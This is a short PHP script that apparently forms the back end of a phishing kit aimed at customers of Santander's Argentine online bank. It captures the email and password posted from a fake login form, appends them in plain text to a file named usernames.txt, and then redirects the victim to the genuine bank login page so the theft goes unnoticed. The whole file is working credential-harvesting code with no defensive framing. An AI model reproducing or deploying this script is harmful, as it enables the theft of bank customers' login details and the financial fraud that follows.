<?php

file_put_contents("usernames.txt", "Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: https://www2.personas.santander.com.ar/obp-webapp/angular/#!/login');
exit();
